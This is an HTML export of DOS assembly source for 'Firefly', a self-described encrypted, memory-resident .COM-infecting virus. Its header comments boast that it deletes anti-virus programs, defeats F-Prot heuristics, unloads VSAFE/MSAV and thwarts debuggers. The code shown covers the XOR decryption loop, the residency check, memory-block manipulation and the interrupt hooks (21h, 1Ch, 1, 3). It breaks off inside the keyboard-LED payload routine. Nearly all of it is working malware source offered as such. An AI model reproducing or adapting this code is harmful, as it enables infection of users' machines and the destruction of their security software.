<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;FIREFLY virus, by Nikademus.                </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Firefly is an encrypted, memory resident virus which infects</span><span class="sc0">
</span><span class="sc1">;.COMfiles on load.  It incorporates code from Proto-T, </span><span class="sc0">
</span><span class="sc1">;LokJaw and YB-X viruses and, when in memory, attacks a large selection</span><span class="sc0">
</span><span class="sc1">;of anti-virus programs as they are executed.  Anti-virus programs</span><span class="sc0">
</span><span class="sc1">;identified by Firefly's execute/load handler are deleted.</span><span class="sc0">
</span><span class="sc1">;Firefly incorporates simple code from previous issues of the newsletter</span><span class="sc0">
</span><span class="sc1">;designed to de-install generic VSAFE resident virus activity</span><span class="sc0">
</span><span class="sc1">;filters designed for Microsoft by Central Point Software.  It</span><span class="sc0">
</span><span class="sc1">;contains instructions - specifically a segment of pseudo-nested </span><span class="sc0">
</span><span class="sc1">;loops - which spoof F-Protect's expert system generic virus</span><span class="sc0">
</span><span class="sc1">;identification feature.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;FIREFLY also includes a visual marker tied to the system timer</span><span class="sc0">
</span><span class="sc1">;tick interrupt (1Ch) which slowly cycles the NumLock, CapsLock</span><span class="sc0">
</span><span class="sc1">;and ScrollLock LEDs on the keyboard.  This produces a noticeable</span><span class="sc0">
</span><span class="sc1">;twinkling effect when the virus is active on a machine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Anti-anti-virus measures used by Firefly vary in effectiveness</span><span class="sc0">
</span><span class="sc1">;dependent upon how a user employs software.  For example, while</span><span class="sc0">
</span><span class="sc1">;Firefly is designed to delete the Victor Charlie anti-virus</span><span class="sc0">
</span><span class="sc1">;shell, VC.EXE, a user who employs the software packages utilities</span><span class="sc0">
</span><span class="sc1">;for generic virus detection singly, will not be interfered with</span><span class="sc0">
</span><span class="sc1">;by the virus. Your results may vary, but the virus does effectively</span><span class="sc0">
</span><span class="sc1">;delete anti-virus programs while in memory unless steps are taken</span><span class="sc0">
</span><span class="sc1">;beforehand to avoid this.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Firefly incorporates minor code armoring techniques designed to thwart</span><span class="sc0">
</span><span class="sc1">;trivial debugging.</span><span class="sc0">

        
        
        </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">code</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">vir_len</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0">                    </span><span class="sc1">; 16 bytes per paragraph </span><span class="sc0">
</span><span class="sc5">encryptlength</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">



</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">        </span><span class="sc1">; The Encryption Head</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryptlength</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">encryption_loop</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                 </span><span class="sc1">; XOR WORD PTR [BX], ????h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">encryption_value_1</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                 </span><span class="sc1">; XOR WORD PTR [BX+2], ????h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">77h</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; 2 different random words</span><span class="sc0">
</span><span class="sc5">encryption_value_2</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; give 32-bit encryption</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encryption_loop</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">                                           
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">             
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'[Firefly] By Nikademus $'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'Greetings to Urnst Kouch and the CRYPT staff. $'</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bp_fixup</span><span class="sc0">                 </span><span class="sc1">; bp fixup to determine</span><span class="sc0">
</span><span class="sc5">bp_fixup</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; locations of data</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; with respect to the new      </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bp_fixup</span><span class="sc0">      </span><span class="sc1">; host                  </span><span class="sc0">

</span><span class="sc5">Is_I_runnin</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; screwing</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; heuristic scanning</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2C2Ch</span><span class="sc0">                 </span><span class="sc1">;  </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">; call to see if runnin  </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFh</span><span class="sc0">                </span><span class="sc1">; am i resident?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cut_hole</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fix_victim</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; replace victims 3 bytes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">                  </span><span class="sc1">; stops one of SCAN's    </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">                  </span><span class="sc1">; generic scan attempts</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; (scan only worked on        </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; unencrypted copies </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">; regardless)</span><span class="sc0">
</span><span class="sc5">Bye_Bye</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; jump to 100h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; (start of victim)</span><span class="sc0">
</span><span class="sc5">cut_hole</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5945h</span><span class="sc0">                </span><span class="sc1">; pull CPAV (MSAV)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64001d</span><span class="sc0">               </span><span class="sc1">; out of memory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">                      </span><span class="sc1">; (This also screws with</span><span class="sc0">
                         </span><span class="sc1">;  TBCLEAN ???????)</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; more screwing of</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; heuristic scanning</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">; reduce memory size     </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;    </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5a</span><span class="sc0">    </span><span class="sc1">;    </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fix_victim</span><span class="sc0">               </span><span class="sc1">;         </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;    </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; # of 16byte paragraphs      </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; to grab (4k)</span><span class="sc0">
</span><span class="sc5">Zopy_me</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; copy self to the new</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; 'unused' part of memory    </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;    </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;          </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0100</span><span class="sc0">               </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">;   </span><span class="sc0">

</span><span class="sc5">Hookroutines</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; interrupt manipulation (Happy!, Happy!)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;     (Joy!, Joy!)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                        </span><span class="sc1">; push 0000h</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_1Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; save 1C</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_1Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; save 21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">; bx = ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; put int 21h into 1 and 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; this should screw   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; most debuggers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Firefly</span><span class="sc0"> </span><span class="sc1">; put self in 21 </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1Ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lights</span><span class="sc0">  </span><span class="sc1">; hook 1C</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fix_victim</span><span class="sc0">
</span><span class="sc5">Lights</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; keyboard lights changer...</span><span class="sc0">
                        </span><span class="sc1">; found in NIKTRKS1.ZIP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; save these</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">63d</span><span class="sc0">         </span><span class="sc1">; after 63 clicks</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">one</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">126d</span><span class="sc0">        </span><span class="sc1">; after 126 clicks</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">two</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">189d</span><span class="sc0">        </span><span class="sc1">; after 189 clicks</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">three</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">        </span><span class="sc1">; have we counted to 255?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">clear</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; increase click count</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endme</span><span class="sc0">
</span><span class="sc5">clear</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; clear click count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">              </span><span class="sc1">; ds:bx = location o' flags</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; clear keyboard flag(s)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endme</span><span class="sc0">
</span><span class="sc5">one</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">click</span><span class="sc4">]</span><span class="sc0">
